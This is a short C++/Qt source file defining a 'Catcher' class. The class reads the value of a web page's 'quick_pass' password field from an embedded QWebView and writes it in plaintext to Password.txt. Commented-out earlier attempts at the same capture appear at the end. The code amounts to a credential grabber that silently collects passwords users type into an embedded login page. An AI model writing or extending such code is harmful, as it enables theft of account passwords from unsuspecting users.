#include "Catcher.h"

Catcher::Catcher(QWebView* wb):tmp(wb){
}

void Catcher::Catch(){

    QWebElement wb = tmp->page()->currentFrame()->findFirstElement("#quick_pass");

    pass=wb.evaluateJavaScript("this.value").toString();

    std::string outs=pass.toStdString();

    std::ofstream out("Password.txt");

    out<<outs;
}


//temp = webView->page()->currentFrame()->findFirstElement("#quick_pass");
//pass=tmp->findFirstElement("#quick_pass")->attribute("value","No pass :C");
//pass=wb.attribute("email.value","No pass :C");
